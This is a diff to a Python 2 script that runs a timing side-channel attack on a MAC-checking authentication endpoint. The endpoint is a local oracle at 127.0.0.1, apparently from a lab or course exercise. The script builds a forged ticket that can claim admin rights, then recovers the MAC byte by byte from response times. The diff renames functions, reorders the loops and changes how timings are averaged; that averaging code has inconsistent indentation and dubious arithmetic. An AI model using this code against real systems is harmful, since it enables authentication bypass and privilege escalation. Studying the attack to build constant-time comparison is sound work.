@@ -13,9 +13,11 @@ import operator
 
 ORACLE_HOST = "127.0.0.1"
 QUERY_PATH = "/auth.php?"
-RETRY = 1000
+RETRY = 800
 
-# generate ticket according to command line argument
+"""
+    generate ticket according to command line argument
+"""
 def generate_ticket():
     if (args.username is None):
         username = "shis" #shis
@@ -34,7 +36,10 @@ def generate_ticket():
 
     return "{\"username\":\""+ username +"\",\"is_admin\":\""+ is_admin +"\",\"expired\":\""+expiration+"\"}"
 
-# convert int array to hex string
+
+"""
+    convert int array to hex string
+"""
 def to_hex_string(array):
     str=""
     for i in range (0, 32):
@@ -53,11 +58,20 @@ def validate_MAC(query):
     resp = conn.getresponse()
 
 """
+    calculate the interval between request and response
+"""
+def get_response_time(query):
+    before = nanotime.now()
+    validate_MAC(query)
+    after = nanotime.now()
+    return int(after - before)
+
+"""
     For each byte of MAC, try multiple times to obtain 
     the value of longest response time from validation server
     which is the correct byte value for the MAC
 """
-def timming_attack():
+def timing_attack():
 
     ticket = generate_ticket()
     print ticket
@@ -69,8 +83,8 @@ def timming_attack():
 
     for i in range (0, 32):
         # One time result maybe unreliable, 
-        for k in range (0, RETRY):
-            for j in range (0, 16):
+        for j in range (0, 16):
+            for k in range (0, RETRY):
                 # from left to right, test the value of one byte
                 print str(i)+",("+str(k+1)+"/"+str(RETRY)+"),"+str(j)
 
@@ -79,24 +93,23 @@ def timming_attack():
                 print "mac: " + MAC
 
                 query = "ticket=" + ticket + "&mac=" + MAC
-                before = nanotime.now()
-                # call oracle
-                validate_MAC(query)
-                after = nanotime.now()
-                # compute response time
-                interval = int(after - before)
+                interval = get_response_time(query)
                 print "interval: " + str(interval)
 
                 # add the response time to dictionary with previous result
                 if not j in dict_time:
                     dict_time[j] = interval
                 else:
-                    dict_time[j] += interval
+                    #if not interval > dict_time[j] * 2:
+                    dict_time[j] = interval + dict_time[j]
+		
+	    dict_time[j] = dict_time[j] / k
         # the one with statistically longest resonse time in one set of character
         # is the valid character in mac 
         MAC_array[i] = max(dict_time.iteritems(), key=operator.itemgetter(1))[0]
         # clean the dictonary for next character
         dict_time.clear()
+    print "mac: " + MAC
 
 
 if __name__ == "__main__":
@@ -105,4 +118,4 @@ if __name__ == "__main__":
    parser.add_argument('-a','--is_admin', help='Is the user admin, true/false')
    parser.add_argument('-e','--expiration', help='Expiration date of the ticket, e.g. 2015-10-07')
    args = parser.parse_args()
-   timming_attack()
+   timing_attack()
